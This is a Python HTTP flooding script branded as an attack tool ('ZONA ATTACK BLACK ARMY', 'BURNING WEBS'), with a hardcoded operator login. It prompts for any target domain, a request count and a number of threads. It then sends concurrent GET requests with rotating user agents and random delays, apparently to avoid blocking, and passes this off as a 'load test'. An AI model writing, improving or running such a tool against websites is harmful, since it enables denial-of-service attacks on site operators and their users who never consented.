import requests
import concurrent.futures
import time
import random
import logging
import os
from itertools import cycle

MIN_DELAY = 0.1   # seconds
MAX_DELAY = 1.0   # seconds

os.system("clear")
time.sleep(3)
print("\033[38;5;220m•••• SELAMAT DATANG DI ZONA ATTACK BLACK ARMY ••••")
time.sleep(3)
print("\033[37m•••• SCRIPT INI DI DEDIKASIKAN UNTUK PARA SYUHADA ••••")
time.sleep(3)
print("\033[32m•••• YANG SYAHID DALAM AREA KM50 ••••")
time.sleep(5)
print("\033[38;5;220mLoading...")
time.sleep(5)

os.system('clear')
attemps = 0
print("""

  \033[38;5;220m╔═════════════════════════════════════════════════════════════════╗                            
  \033[38;5;220m║\033[95m                              
  \033[38;5;220m║\033[95m╭██   ╭██ \033[33m╭████ ╭████ \033[38;5;39m        ╭█████████  ╭███████
  \033[38;5;220m║\033[95m│██ ╭╯██  \033[33m│██ ╭██─╮██ \033[38;5;39m        │██──────╯ │██────╮██
  \033[38;5;220m║\033[95m│██ ╯██  \033[33m │██ │██ │██ \033[38;5;39m        │██ ╭█████ │██    │██
  \033[38;5;220m║\033[95m│██ ██   \033[33m │██ │██ │██ \033[38;5;39m        │██│██──╮██│██    │██
  \033[38;5;220m║\033[95m│██ ╮██  \033[33m │██ │██ │██ \033[38;5;206m╭██████\033[38;5;39m         │██│██    │██
  \033[38;5;220m║\033[95m│██ ╰╮██ \033[33m │██ ╰─╯ │██ \033[38;5;206m╰─────╯\033[38;5;39m         │██│██    │██
  \033[38;5;220m║\033[95m│██  ╰╮██ \033[33m│██     │██ \033[38;5;39m \033[38;5;39m       ╭██     │██│██    │██
  \033[38;5;220m║\033[95m╰──╯  ╰─╯ \033[33m╰─╯     ╰─╯\033[38;5;39m          │████████   │██████
  \033[38;5;220m║\033[38;5;39m                               ╰────────╯╰──────╯
  \033[38;5;220m╚═════════════════════════════════════════════════════╝
""")
while attemps < 100:
    print("\033[38;5;6m┏━━KunFayz━━⬣")
    username = input("\033[38;5;6m┗> Enter Username: \033[33m")
    password = input("\033[38;5;6m┗> Enter password: \033[30m")

    if username == 'blackarmy' and password == 'admin':
        print("\033[100m \033[37m••> BURNING WEBS 210πiS \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue  

def load_user_agents(filename="user-agent.txt"):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            agents = [line.strip() for line in f if line.strip()]
        if not agents:
            raise ValueError("User-agent list is empty!")
        return agents
    except Exception as e:
        print(f"Error loading user agents: {e}")
        return ["Mozilla/5.0 (default UA)"]

def send_request(url, req_id, ua_cycle):
    delay = random.uniform(MIN_DELAY, MAX_DELAY)
    time.sleep(delay)

    headers = {"User-Agent": next(ua_cycle)}
    start = time.time()
    try:
        response = requests.get(url, headers=headers, timeout=10)
        elapsed = time.time() - start

        if response.status_code == 200:
            msg = (f"\033[32m[Request {req_id}]\033[94m Success ({response.status_code}) | "
                   f"\033[38;5;214mDelay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        elif response.status_code == 403:
            msg = (f"\033[37m[Request {req_id}]\033[38;5;206m Forbidden (403) | "
                   f"\033[37mDelay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        else:
            msg = (f"[Request {req_id}] ⚠️ Failed ({response.status_code}) | "
                   f"Delay: {delay:.3f}s | RT: {elapsed:.3f}s | UA: {headers['User-Agent']}")
        print(msg)
        logging.info(msg)
        return response.status_code
    except Exception as e:
        elapsed = time.time() - start
        msg = f"[Request {req_id}]🆘 Error: {e} | Delay: {delay:.3f}s | RT: {elapsed:.3f}s"
        print(msg)
        logging.error(msg)
        return None

def main():

    domain = input("Enter website domain (e.g. https://example.com): ").strip()
    try:
        total_requests = int(input("Enter number of requests: "))
        workers = int(input("Enter number of workers (parallel threads): "))
    except ValueError:
        print("🆘 Invalid input! Please enter integers for requests and workers.")
        return

    if total_requests <= 0 or workers <= 0:
        print("🆘 Requests and workers must be positive integers!")
        return

    logging.basicConfig(filename="load_test.log", level=logging.INFO,
                        format="%(asctime)s - %(levelname)s - %(message)s")

    user_agents = load_user_agents("user-agent.txt")
    ua_cycle = cycle(user_agents)

    print(f"\nStarting load test on {domain} with {total_requests} requests using {workers} workers...")
    print(f"Random delay per request: {MIN_DELAY}–{MAX_DELAY} seconds\n")
    start_time = time.time()

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(send_request, domain, i+1, ua_cycle) for i in range(total_requests)]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())

    end_time = time.time()
    print("\n--- Load Test Summary ---")
    print(f"Total requests sent: {len(results)}")
    print(f"Successful responses: {results.count(200)}")
    print(f"403 Forbidden responses: {results.count(403)}")
    print(f"Other errors: {len([r for r in results if r not in (200, 403) and r is not None])}")
    print(f"Total time: {end_time - start_time:.2f} seconds")
    print("Logs saved to: load_test.log")

if __name__ == "__main__":
    main()
